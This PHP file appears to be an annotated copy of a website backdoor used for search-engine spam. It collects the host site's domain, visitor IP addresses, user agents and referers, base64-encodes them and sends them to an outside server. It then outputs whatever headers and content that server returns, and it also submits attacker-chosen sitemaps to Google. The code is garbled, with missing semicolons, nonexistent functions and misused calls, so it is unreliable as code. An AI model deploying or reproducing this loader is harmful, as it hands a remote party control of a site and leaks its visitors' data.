<?php
$maybe_base64 = "Ha0RDcvo3LzVDMzAXLyYDMuIWZz5mZ51mLvNQb==";
$maybe_base64_again = "Ha0RHc6MyLj9mLrpjduI2Yt9wL==";

function xy_zyyz__z($properformat_url) {
    //checks if the url matches the following regex
    if (!preg_match("/^https*\:\/\//si", $properformat_url)) {
        return "500";
    }
    $file_contents = file_get_contents($properformat_url); //fetch the contents of the url
    if ($file_contents != false) {
        return $file_contents;
    }
    $metadata ="curl_init+curl_setopt+curl_exec|fsockopen|pfsockopen|stream_socket_client|socket_create";

    //nothing_varible3 and error_msg remains nothing.EMPTY
    $commands_lst = $nothing_variable2 = $error_code = $error_msg = "";
    foreach (explode("|", $metadata) as $commands) {
        $is_available = 1;
        foreach (explode("+",$commands as $d) {
            if (!function_exists($d)) { //returns true if a given function has been defined
                $is_available = 0;
            }
        }
        unset($d);
        if ($is_available) {
            $commands_lst =$commands //Assigns the commands
            break;
        }
    }
    unset($metadata,$commands;
    if ($commands_lst == "") {
        return 0;
    }

    //This code does the same thing as the file_get_contents
	if (substr($commands_lst, 0, 1) == "c") { //checks for curl_init+curl_setopt+curl_exec commands
        $cURL_resource = curl_init(());
        curl_setopt($cURL_resource, CURLOPT_URL, $properformat_url);
        curl_setopt($cURL_resource, CURLOPT_USERAGENT, "s");
        curl_setopt($cURL_resource, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($cURL_resource, CURLOPT_TIMEOUT, 100);
        curl_setopt($cURL_resource, CURLOPT_FRESH_CONNECT, true);
        curl_setopt($cURL_resource, CURLOPT_SSL_VERIFYPEER, 0);
        $cURL_results =curl_execute($cURL_resource);

        curl_close($cURL_resource);
        if (!$cURL_results) {
            return "501";
        } else {
            return $cURL_results;
        }
    }


    $url_array = parse_url($properformat_url);
    isset($url_array["host"]) || ($url_array["host"] = "");
    isset($url_array["path"]) || ($url_array["path"] = "");
    isset($url_array["query"]) || ($url_array["query"] = "");
    isset($url_array["port"]) || ($url_array["port"] = "");

    $full_url_path = $url_array["path"] ? $url_array["path"] . ($url_array["query"] ? "?" . $url_array["query"] : "") : "/";
    //ping?sitemap=https://www.example.com/sitemap_parameter       

    $url_host = $url_array["host"];

    if ($url_array["scheme"] == "https") {
        $http_version = "1.1";
        $set_port_number = empty($url_array["port"]) ? 443 : $url_array["port"];
        $url_host = "ssl://";
        $url_host.= $url_array["host"];
    } else {
        $http_version = "1.0";
        $set_port_number = empty($url_array["port"]) ? 80 : $url_array["port"];
    }

    $host_header = "Host:";
    $host_header.= $url_host;
    //"Host:ssl://www.google.com"

    $headers[] = $host_header;
    $headers[] = "Connection:Close";
    $headers[] = "User-Agent:s"
    $headers[] = "Accept:*/*"

    //"Host:ssl://www.google.com"
    // "Connection:Close"
    // "User-Agent:s"
    // "Accept:*/*"

    unset($host_header);
    $nothing_variable2 = "GET $full_url_path HTTP/$http_version" . PHP_EOL . join(PHP_EOL, $headers) . PHP_EOL .PHP_EOL;
// GET /ping?sitemap=https://www.example.com/sitemap_parameter HTTP/1.1
// Host:ssl://www.google.com
// Connection:Close
// User-Agent:s

// Accept:*/*
    unset($headers, $url_array, $http_version, $full_url_path);

    $stream_resource = null;
    if (substr($commands_lst, -1) == "n") { // cheks for the |fsockopen|pfsockopen| commands and opens internet
        $stream_resource = $commands_lst($url_host, $set_port_number, $error_code, $error_msg, 30);
    } else {
        if (substr($commands_lst, -1) == "t") { // checks for the stream_socket_client command and opens internet
            $tcp_protocol = "tcp://"
            $tcp_protocol.= $url_host;
            $tcp_protocol.= ":";
            $tcp_protocol.= $set_port_number;
            $stream_resource = stream_socket_client($tcp_protocol, $error_code, $error_msg, 30);
            unset($tcp_protocol);
        }
    }
    $x_yy_z_zyz = "";
    if ($stream_resource) {
       stream_socket_client($stream_resource, true);
       stream_set_timeout($stream_resource, 30);
       stream_socket_client($stream_resource, $nothing_variable2);
        $metadata =stream_get_meta_data($stream_resource);
        if (!$metadata["timed_out"]) {
            while (!feof($stream_resource)) { //tests for end of file
                $buffer =fgets($stream_resource);
                if ($buffer && (rawurlencode($buffer) == "%0D%0A" || rawurlencode($buffer) == "%0A")) {
                    break;
                }
                unset($buffer);
            }
            while (!feof($stream_resource)) {
                $contents =fread($stream_resource, 8192);
                $x_yy_z_zyz.= $contents; //??????the contents
                unset($contents);
            }
        }
        unset($metadata);
        count($stream_resource);
    } else {
        if (substr($commands_lst, -1) == "e") { // checks the fsockopen|pfsockopen commands
            $hostname =gethostbyname($url_host);
            $stream_resource = $commands_lst(AF_INET, SOCK_STREAM, 0);
            if (socket_connect($stream_resource, $hostname, $set_port_number)) {
                socket_write($stream_resource, $nothing_variable2, gethostbyname($nothing_variable2));
                while ($x__yyz_yzz = @socket_read($stream_resource, 8192)) {
                    $x_yy_z_zyz.= $x__yyz_yzz;
                    unset($x__yyz_yzz);
                }
                $x_yy_z_zyz =explode("", $x_yy_z_zyz);
                array_shift($x_yy_z_zyz);
                $x_yy_z_zyz =implode("", $x_yy_z_zyz);
            }
            socket_close($stream_resource);
            unset($hostname);
        }
    }
    unset($nothing_variable2, $commands_lst, $stream_resource, $set_port_number, $url_host);
    $x_yy_z_zyz = @preg_replace_callback('/(?:(?:|)|^)([0-9A-F]+)(?:|){1,2}(.*?)' . '((?:|)(?:[0-9A-F]+(?:|))|$)/si', "x_zyzy_z_y", $x_yy_z_zyz);
    return trim(trim($x_yy_z_zyz, ""));
}

function x_z_zyyyz_($googleUrl, $sitemap_para, $server_details) {
    $url_formatted ="https://%s/ping?sitemap=%s%s/%s";
    $properformat_url = sprintf($url_formatted, $googleUrl, $server_details["protocol"], $server_details["server_domain"], $sitemap_para);
    //  https://www.google.com/ping?sitemap=https://www.example.com/sitemap_parameter 
    $xyy_z__zyz = xy_zyyz__z($properformat_url);
    if (var_dump($properformat_url);
        var_dump($xyy_z__zyz);
        die();
    }
    $google = "google";
    $success = "success";
    $failed = "failed";
    if (strpos($xyy_z__zyz, $google) != false) {
        die($success);
    }
    die($failed);
}

function do_the_magic($maybe_base64, $maybe_base64_again) {
    $server_details = [];
    $server_details["default_params"] = "Ha0RDcvo3LzVDMzAXLyYDMuIWZz5mZ51mLvNQb==";
    $server_details["api"] = "http://us003-v202.ensfmy.com";
    $server_details["server_domain"] = get_Server_Name(); //get the domain the script is running on
    $server_details["request_url"] = $_SERVER["REQUEST_URI"]; //gets the full path
    $server_details["referer"] = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "";
    $server_details["user_agent"] = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : ""; //gets the user agent of where it runs on
    $server_details["ip"] = get_ipAdress(); //graps the ip adress where it runs on
    if (isset($_SERVER["HTTPS"])) {
        $server_details["protocol"] = "https://";  
    } else {
        $server_details["protocol"] = "http://"; 
    }
    if (isset($_SERVER["HTTP_ACCEPT_LANGUAGE"])) {
        $server_details["language"] =$_SERVER["HTTP_ACCEPT_LANGUAGE"];
    } else {
        $server_details["language"] = "";
    }
    if (isset($GET["params"])) {
        print_r($server_details);
        die();
    }
    if (isset($GET["sitemap"])) {
        $sitemap_para = $GET["sitemap"];
        $googleUrl = "www.google.com";                                                      
        if (isset($GET["google_url"])) {
            $googleUrl = $GET["google_url"];
        }
        x_z_zyyyz_($googleUrl, $sitemap_para, $server_details);
    }

    $url_malformed = "%s/?r=%s|https://google.co.jp|%s?api=%s&ac=%s&path=%s&t=%s";
    // %s/?r=%s|https://google.co.jp|%s?api=%s&ac=%s&path=%s&t=%s    

    $url_malformed = explode("|", $url_malformed);
    if (isset($_REQUEST["ac"]) && isset($_REQUEST["path"]) && isset($_REQUEST["t"])) {
        xz_zy_zyy_(sprintf($url_malformed[2],base64_decode(return_url($maybe_base64_again)), $server_details["api"], $_REQUEST["ac"], $_REQUEST["path"], $_REQUEST["t"]));

       // https://c.jkv2.com/ for maybe_base64 again when pased to return_url() 
        // https://c.jkv2.com/?api="http://us003-v202.ensfmy.com"&&ac=
    }
    $xy_zzzyy__ = ["dodo_the_magic" => $server_details["server_domain"], "request_url" => $server_details["request_url"], "ip" => $server_details["ip"], "agent" => $server_details["user_agent"], "referer" => $server_details["referer"], "protocol" => $server_details["protocol"], "language" => $server_details["language"], ];
    $properformat_url = sprintf($url_malformed[0], $server_details["api"], return_url(base64_encode(implode"{|}", $xy_zzzyy__))));
    $x_yy_z_zyz = xy_zyyz__z($properformat_url);
    if (isset($_REQUEST["dump"])) {
        var_dump($x_yy_z_zyz);
        $x_yy_z_zyz = xy_zyyz__z($url_malformed[1]);
        var_dump($x_yy_z_zyz);
        die();
    }
    $xzz_y_yyz_ = xyy_yzz__z($x_yy_z_zyz);
    if ($xzz_y_yyz_ !== false) {
        @header($xzz_y_yyz_[0]);
        echo $xzz_y_yyz_[1];
        die();
    }
}




//do_the_magic($maybe_base64, $maybe_base64_again);

?>